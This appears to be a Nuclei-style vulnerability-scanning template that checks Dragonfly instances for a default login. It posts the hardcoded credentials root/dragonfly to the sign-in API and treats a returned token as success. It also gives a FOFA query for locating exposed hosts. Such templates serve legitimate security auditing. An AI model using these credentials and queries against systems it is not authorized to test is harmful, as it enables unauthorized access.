http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"token":'
    - '{"expire":'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /api/v1/users/signin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json;charset=UTF-8


    {"name":"{{username}}","password":"{{password}}"}

    '
id: dragonfly-default-login
info:
  author: DhiyaneshDK
  description: 'Dragonfly was using the default username, and the password was discovered.

    '
  metadata:
    fofa-query: body="logo-dragonfly.png"
    max-request: 1
    verified: true
  name: Dragonfly - Default Login
  severity: high
  tags: dragonfly,default-login,vuln
variables:
  password: dragonfly
  username: root
